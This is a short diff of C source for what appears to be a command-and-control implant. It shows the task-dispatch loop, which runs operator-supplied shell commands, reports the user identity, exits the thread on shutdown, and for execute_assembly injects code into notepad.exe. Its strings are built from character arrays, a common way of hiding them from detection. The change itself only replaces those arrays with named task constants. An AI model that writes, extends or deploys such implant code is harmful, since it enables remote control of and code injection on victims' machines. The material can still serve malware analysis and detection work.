@@ -296,17 +296,17 @@ void myMain()
         CHAR shutdown[] = { 's', 'h', 'u', 't', 'd', 'o', 'w', 'n', 0 };
         CHAR executeAssembly[] = { 'e', 'x', 'e', 'c', 'u', 't', 'e', '_', 'a', 's', 's', 'e', 'm', 'b', 'l', 'y', 0 };
 
-        if (my_strcmp(task.taskType, cmd) == 0)
+        if (my_strcmp(task.taskType, TASK_CMD) == 0)
         {
             orgOutput = ((RUNCMD)PEsgStdApi->RunCmd)(task.taskParams, &sizeOfOutput);
             taskOutput = myTrim(api, orgOutput, '\n');
         }
-        else if (my_strcmp(task.taskType, whoami) == 0)
+        else if (my_strcmp(task.taskType, TASK_WHOAMI) == 0)
         {
             orgOutput = ((WHOAMI)PEsgStdApi->Whoami)();
             taskOutput = myTrim(api, orgOutput, '\n');
         }
-        else if (my_strcmp(task.taskType, shutdown) == 0)
+        else if (my_strcmp(task.taskType, TASK_SHUTDOWN) == 0)
         {
             const DWORD dwEncodedExitOutputSize = 17;
             // base64 value of exitSuccess
@@ -322,7 +322,7 @@ void myMain()
 
             ((EXITTHREAD)api->ExitThread)(0);
         }
-        else if (my_strcmp(task.taskType, executeAssembly) == 0)
+        else if (my_strcmp(task.taskType, TASK_EXECUTE_ASSEMBLY) == 0)
         {
             // use notepad.exe to inject code into
             CHAR lpApplicationName[] = { 'C', ':', '\\', 'W', 'i', 'n', 'd', 'o', 'w', 's', '\\', 'S', 'y', 's', 't', 'e', 'm', '3', '2', '\\', 'n', 'o', 't', 'e', 'p', 'a', 'd', '.', 'e', 'x', 'e', 0 };
